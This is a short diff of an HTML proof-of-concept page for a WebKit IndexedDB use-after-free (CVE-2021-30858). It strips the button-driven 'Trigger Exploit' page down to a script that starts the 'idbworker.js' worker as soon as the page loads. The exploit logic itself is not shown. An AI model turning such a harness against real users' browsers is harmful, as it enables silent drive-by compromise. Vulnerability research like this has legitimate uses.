@@ -1,50 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>WebKit UAF PoC (CVE-2021-30858)</title>
-    <style>
-        #trigger {
-            margin: 20px;
-            padding: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #f44336;
-            color: white;
-            border: none;
-            border-radius: 4px;
-        }
-        #trigger:hover {
-            background-color: #d32f2f;
-        }
-        #output {
-            margin: 20px;
-            font-family: monospace;
-            white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-    <h1>WebKit UAF PoC (CVE-2021-30858)</h1>
-    <p>Click to test IndexedDB UAF vulnerability</p>
-    <button id="trigger">Trigger Exploit</button>
-    <div id="output"></div>
+<html> 
     <script>
-        function log(message) {
-            const output = document.getElementById('output');
-            output.textContent += message + '\n';
-        }
-
-        function triggerExploit() {
-            log('Starting Web Worker...');
-            const worker = new Worker('idbworker.js');
-            worker.onmessage = function(e) {
-                log(e.data);
-            };
-            worker.postMessage('start');
-        }
-
-        document.getElementById('trigger').addEventListener('click', triggerExploit);
+        w = new Worker('idbworker.js');
     </script>
-</body>
 </html>
